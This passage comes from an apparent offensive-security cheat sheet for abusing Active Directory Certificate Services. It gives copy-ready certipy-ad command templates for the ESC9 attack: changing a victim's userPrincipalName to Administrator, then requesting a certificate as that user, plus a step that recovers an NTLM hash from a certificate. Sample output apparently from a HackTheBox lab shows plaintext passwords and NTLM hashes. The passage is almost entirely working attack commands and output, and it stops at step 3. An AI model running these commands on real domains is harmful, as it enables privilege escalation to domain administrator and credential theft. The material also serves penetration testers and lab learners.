<div class="highlight"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">cat cert_b64 | base64 -d &gt; cert.p12
</span></span></span></code><div class="output-bubble">Sample Output:
TO-DO</div></pre></div><h4 id="6-get-ntlm-hash">6. Get NTLM Hash</h4>
<div class="highlight"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">certipy-ad auth -pfx cert.p12 -domain <span class="o editable-keyword">&lt;DOMAIN&gt;</span> -dc-ip <span class="o editable-keyword">&lt;DC_IP&gt;</span>
</span></span></span></code><div class="output-bubble">Sample Output:
TO-DO</div></pre></div><p><small><em>Ref: <a href="https://github.com/CICADA8-Research/RemoteKrbRelay">RemoteKrbRelay</a></em></small></p></div></div>

<p></p>
<hr>
<h3 id="esc9-no-security-extension-on-certificate-template">ESC9: No Security Extension on Certificate Template</h3>
<p class="tabs">
<button data-tabset="set12" data-tabcontent="tab1" class="active">Linux</button>

</p><div class="tabset-wrapper" data-tabset-group="set12"><div class="tabcontent active" data-tabset="set12" data-tabcontent="tab1"><h4 id="1-modify-target-users-userprincipalname-with-genericallgenericwrite">1. Modify Target Users userPrincipalName (With GenericAll/GenericWrite)</h4>
<div class="highlight password codeBlock-start"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Password
</span></span><span class="line"><span class="cl"><span class="go">certipy-ad account update -u '<span class="o editable-keyword">&lt;USER&gt;</span>@<span class="o editable-keyword">&lt;DOMAIN&gt;</span>' -p '<span class="o editable-keyword">&lt;PASSWORD&gt;</span>' -dc-ip <span class="o editable-keyword">&lt;DC_IP&gt;</span> -user <span class="o editable-keyword">&lt;TARGET_USER&gt;</span> -upn Administrator
</span></span></span></code><div class="output-bubble">Sample Output:
<span class="line"><span class="cl"><span class="gp">$</span> certipy-ad account update -u <span class="s1">'management_svc@certified.htb'</span> -p <span class="s1">'Password123!'</span> -dc-ip 10.129.231.186 -user ca_operator -upn Administrator
</span></span><span class="line"><span class="cl"><span class="go">Certipy v5.0.3 - by Oliver Lyak (ly4k)
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] Updating user 'ca_operator':
</span></span></span><span class="line"><span class="cl"><span class="go">    userPrincipalName                   : Administrator
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Successfully updated 'ca_operator'
</span></span></span></div></pre></div><div class="highlight ntlm codeBlock"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> NTLM
</span></span><span class="line"><span class="cl"><span class="go">certipy-ad account update -u '<span class="o editable-keyword">&lt;USER&gt;</span>@<span class="o editable-keyword">&lt;DOMAIN&gt;</span>' -hashes <span class="o editable-keyword">&lt;HASH&gt;</span> -dc-ip <span class="o editable-keyword">&lt;DC_IP&gt;</span> -user <span class="o editable-keyword">&lt;TARGET_USER&gt;</span> -upn Administrator
</span></span></span></code><div class="output-bubble">Sample Output:
<span class="line"><span class="cl"><span class="gp">$</span> certipy-ad account update -u <span class="s1">'management_svc@certified.htb'</span> -hashes a091c1832bcdd4677c28b5a6a1295584 -dc-ip 10.129.231.186 -user ca_operator -upn Administrator
</span></span><span class="line"><span class="cl"><span class="go">Certipy v5.0.3 - by Oliver Lyak (ly4k)
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] Updating user 'ca_operator':
</span></span></span><span class="line"><span class="cl"><span class="go">    userPrincipalName                   : Administrator
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Successfully updated 'ca_operator'
</span></span></span></div></pre></div><div class="highlight password-based-kerberos codeBlock"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Password-based Kerberos
</span></span><span class="line"><span class="cl"><span class="go">certipy-ad account update -u '<span class="o editable-keyword">&lt;USER&gt;</span>@<span class="o editable-keyword">&lt;DOMAIN&gt;</span>' -p '<span class="o editable-keyword">&lt;PASSWORD&gt;</span>' -k -target <span class="o editable-keyword">&lt;DC&gt;</span> -dc-host <span class="o editable-keyword">&lt;DC&gt;</span> -dc-ip <span class="o editable-keyword">&lt;DC_IP&gt;</span> -user <span class="o editable-keyword">&lt;TARGET_USER&gt;</span> -upn Administrator
</span></span></span></code><div class="output-bubble">Sample Output:
<span class="line"><span class="cl"><span class="gp">$</span> certipy-ad account update -u <span class="s1">'management_svc@certified.htb'</span> -p <span class="s1">'Password123!'</span> -k -target dc01.certified.htb -dc-host dc01.certified.htb -dc-ip 10.129.231.186 -user ca_operator -upn Administrator
</span></span><span class="line"><span class="cl"><span class="go">Certipy v5.0.3 - by Oliver Lyak (ly4k)
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] Updating user 'ca_operator':
</span></span></span><span class="line"><span class="cl"><span class="go">    userPrincipalName                   : Administrator
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Successfully updated 'ca_operator'
</span></span></span></div></pre></div><div class="highlight ntlm-based-kerberos codeBlock"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> NTLM-based Kerberos
</span></span><span class="line"><span class="cl"><span class="go">certipy-ad account update -u '<span class="o editable-keyword">&lt;USER&gt;</span>@<span class="o editable-keyword">&lt;DOMAIN&gt;</span>' -hashes <span class="o editable-keyword">&lt;HASH&gt;</span> -k -target <span class="o editable-keyword">&lt;DC&gt;</span> -dc-host <span class="o editable-keyword">&lt;DC&gt;</span> -dc-ip <span class="o editable-keyword">&lt;DC_IP&gt;</span> -user <span class="o editable-keyword">&lt;TARGET_USER&gt;</span> -upn Administrator
</span></span></span></code><div class="output-bubble">Sample Output:
<span class="line"><span class="cl"><span class="gp">$</span> certipy-ad account update -u <span class="s1">'management_svc@certified.htb'</span> -hashes a091c1832bcdd4677c28b5a6a1295584 -k -target dc01.certified.htb -dc-host dc01.certified.htb -dc-ip 10.129.231.186 -user ca_operator -upn Administrator
</span></span><span class="line"><span class="cl"><span class="go">Certipy v5.0.3 - by Oliver Lyak (ly4k)
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] Updating user 'ca_operator':
</span></span></span><span class="line"><span class="cl"><span class="go">    userPrincipalName                   : Administrator
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Successfully updated 'ca_operator'
</span></span></span></div></pre></div><div class="highlight ticket-based-kerberos codeBlock-end"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Ticket-based Kerberos
</span></span><span class="line"><span class="cl"><span class="go">certipy-ad account update -u '<span class="o editable-keyword">&lt;USER&gt;</span>@<span class="o editable-keyword">&lt;DOMAIN&gt;</span>' -k -dc-host <span class="o editable-keyword">&lt;DC&gt;</span> -target <span class="o editable-keyword">&lt;DC&gt;</span> -dc-ip <span class="o editable-keyword">&lt;DC_IP&gt;</span> -user <span class="o editable-keyword">&lt;TARGET_USER&gt;</span> -upn Administrator
</span></span></span></code><div class="output-bubble">Sample Output:
<span class="line"><span class="cl"><span class="gp">$</span> certipy-ad account update -u <span class="s1">'management_svc@certified.htb'</span> -k -dc-host dc01.certified.htb -target dc01.certified.htb -dc-ip 10.129.231.186 -user ca_operator -upn Administrator
</span></span><span class="line"><span class="cl"><span class="go">Certipy v5.0.3 - by Oliver Lyak (ly4k)
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] Updating user 'ca_operator':
</span></span></span><span class="line"><span class="cl"><span class="go">    userPrincipalName                   : Administrator
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Successfully updated 'ca_operator'
</span></span></span></div></pre></div><h4 id="2-request-a-cert-of-target-user">2. Request a Cert of Target User</h4>
<div class="highlight password codeBlock-start"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Password
</span></span><span class="line"><span class="cl"><span class="go">certipy-ad req -u '<span class="o editable-keyword">&lt;TARGET_USER&gt;</span>' -p '<span class="o editable-keyword">&lt;TARGET_USER_PASSWORD&gt;</span>' -target <span class="o editable-keyword">&lt;TARGET&gt;</span> -dc-ip <span class="o editable-keyword">&lt;DC_IP&gt;</span> -ca <span class="o editable-keyword">&lt;CA&gt;</span> -template <span class="o editable-keyword">&lt;VULN_TEMPLATE&gt;</span>
</span></span></span></code><div class="output-bubble">Sample Output:
<span class="line"><span class="cl"><span class="gp">$</span> certipy-ad req -u <span class="s1">'ca_operator'</span> -p <span class="s1">'Password123!'</span> -target dc01.certified.htb -dc-ip 10.129.231.186 -ca certified-DC01-CA -template CertifiedAuthentication
</span></span><span class="line"><span class="cl"><span class="go">Certipy v5.0.3 - by Oliver Lyak (ly4k)
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] Requesting certificate via RPC
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Request ID is 6
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Successfully requested certificate
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Got certificate with UPN 'Administrator'
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Certificate has no object SID
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Try using -sid to set the object SID or see the wiki for more details
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Saving certificate and private key to 'administrator.pfx'
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Wrote certificate and private key to 'administrator.pfx'
</span></span></span></div></pre></div><div class="highlight ntlm codeBlock"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> NTLM
</span></span><span class="line"><span class="cl"><span class="go">certipy-ad req -u '<span class="o editable-keyword">&lt;TARGET_USER&gt;</span>' -hashes '<span class="o editable-keyword">&lt;TARGET_USER_HASH&gt;</span>' -target <span class="o editable-keyword">&lt;TARGET&gt;</span> -dc-ip <span class="o editable-keyword">&lt;DC_IP&gt;</span> -ca <span class="o editable-keyword">&lt;CA&gt;</span> -template <span class="o editable-keyword">&lt;VULN_TEMPLATE&gt;</span>
</span></span></span></code><div class="output-bubble">Sample Output:
<span class="line"><span class="cl"><span class="gp">$</span> certipy-ad req -u <span class="s1">'ca_operator@certified.htb'</span> -hashes <span class="s1">'b4b86f45c6018f1b664f70805f45d8f2'</span> -k -target dc01.certified.htb -dc-host dc01.certified.htb -dc-ip 10.129.231.186 -ca certified-DC01-CA -template CertifiedAuthentication
</span></span><span class="line"><span class="cl"><span class="go">Certipy v5.0.3 - by Oliver Lyak (ly4k)
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] Requesting certificate via RPC
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Request ID is 6
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Successfully requested certificate
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Got certificate with UPN 'Administrator'
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Certificate has no object SID
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Try using -sid to set the object SID or see the wiki for more details
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Saving certificate and private key to 'administrator.pfx'
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Wrote certificate and private key to 'administrator.pfx'
</span></span></span></div></pre></div><div class="highlight password-based-kerberos codeBlock"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Password-based Kerberos
</span></span><span class="line"><span class="cl"><span class="go">certipy-ad req -u '<span class="o editable-keyword">&lt;TARGET_USER&gt;</span>@<span class="o editable-keyword">&lt;DOMAIN&gt;</span>' -p '<span class="o editable-keyword">&lt;TARGET_USER_PASSWORD&gt;</span>' -k -target <span class="o editable-keyword">&lt;TARGET&gt;</span> -dc-host <span class="o editable-keyword">&lt;DC&gt;</span> -dc-ip <span class="o editable-keyword">&lt;DC_IP&gt;</span> -ca <span class="o editable-keyword">&lt;CA&gt;</span> -template <span class="o editable-keyword">&lt;VULN_TEMPLATE&gt;</span>
</span></span></span></code><div class="output-bubble">Sample Output:
<span class="line"><span class="cl"><span class="gp">$</span> certipy-ad req -u <span class="s1">'ca_operator@certified.htb'</span> -p <span class="s1">'Password123!'</span> -k -target dc01.certified.htb -dc-host dc01.certified.htb -dc-ip 10.129.231.186 -ca certified-DC01-CA -template CertifiedAuthentication
</span></span><span class="line"><span class="cl"><span class="go">Certipy v5.0.3 - by Oliver Lyak (ly4k)
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] Requesting certificate via RPC
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Request ID is 6
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Successfully requested certificate
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Got certificate with UPN 'Administrator'
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Certificate has no object SID
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Try using -sid to set the object SID or see the wiki for more details
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Saving certificate and private key to 'administrator.pfx'
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Wrote certificate and private key to 'administrator.pfx'
</span></span></span></div></pre></div><div class="highlight ntlm-based-kerberos codeBlock"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> NTLM-based Kerberos
</span></span><span class="line"><span class="cl"><span class="go">certipy-ad req -u '<span class="o editable-keyword">&lt;TARGET_USER&gt;</span>@<span class="o editable-keyword">&lt;DOMAIN&gt;</span>' -hashes '<span class="o editable-keyword">&lt;TARGET_USER_HASH&gt;</span>' -k -target <span class="o editable-keyword">&lt;TARGET&gt;</span> -dc-host <span class="o editable-keyword">&lt;DC&gt;</span> -dc-ip <span class="o editable-keyword">&lt;DC_IP&gt;</span> -ca <span class="o editable-keyword">&lt;CA&gt;</span> -template <span class="o editable-keyword">&lt;VULN_TEMPLATE&gt;</span>
</span></span></span></code><div class="output-bubble">Sample Output:
<span class="line"><span class="cl"><span class="gp">$</span> certipy-ad req -u <span class="s1">'ca_operator@certified.htb'</span> -hashes <span class="s1">'b4b86f45c6018f1b664f70805f45d8f2'</span> -k -target dc01.certified.htb -dc-host dc01.certified.htb -dc-ip 10.129.231.186 -ca certified-DC01-CA -template CertifiedAuthentication
</span></span><span class="line"><span class="cl"><span class="go">Certipy v5.0.3 - by Oliver Lyak (ly4k)
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] Requesting certificate via RPC
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Request ID is 6
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Successfully requested certificate
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Got certificate with UPN 'Administrator'
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Certificate has no object SID
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Try using -sid to set the object SID or see the wiki for more details
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Saving certificate and private key to 'administrator.pfx'
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Wrote certificate and private key to 'administrator.pfx'
</span></span></span></div></pre></div><div class="highlight ticket-based-kerberos codeBlock-end"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Ticket-based Kerberos
</span></span><span class="line"><span class="cl"><span class="go">certipy-ad req -u '<span class="o editable-keyword">&lt;TARGET_USER&gt;</span>@<span class="o editable-keyword">&lt;DOMAIN&gt;</span>' -k -target <span class="o editable-keyword">&lt;TARGET&gt;</span> -dc-host <span class="o editable-keyword">&lt;DC&gt;</span> -dc-ip <span class="o editable-keyword">&lt;DC_IP&gt;</span> -ca <span class="o editable-keyword">&lt;CA&gt;</span> -template <span class="o editable-keyword">&lt;VULN_TEMPLATE&gt;</span>
</span></span></span></code><div class="output-bubble">Sample Output:
<span class="line"><span class="cl"><span class="gp">$</span> certipy-ad req -u <span class="s1">'ca_operator@certified.htb'</span> -k -target dc01.certified.htb -dc-host dc01.certified.htb -dc-ip 10.129.231.186 -ca certified-DC01-CA -template CertifiedAuthentication
</span></span><span class="line"><span class="cl"><span class="go">Certipy v5.0.3 - by Oliver Lyak (ly4k)
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] Requesting certificate via RPC
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Request ID is 6
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Successfully requested certificate
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Got certificate with UPN 'Administrator'
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Certificate has no object SID
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Try using -sid to set the object SID or see the wiki for more details
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Saving certificate and private key to 'administrator.pfx'
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Wrote certificate and private key to 'administrator.pfx'
</span></span></span></div></pre></div><h4 id="3-change-back-target-users-userprincipalname">3. Change Back Target Users userPrincipalName</h4>
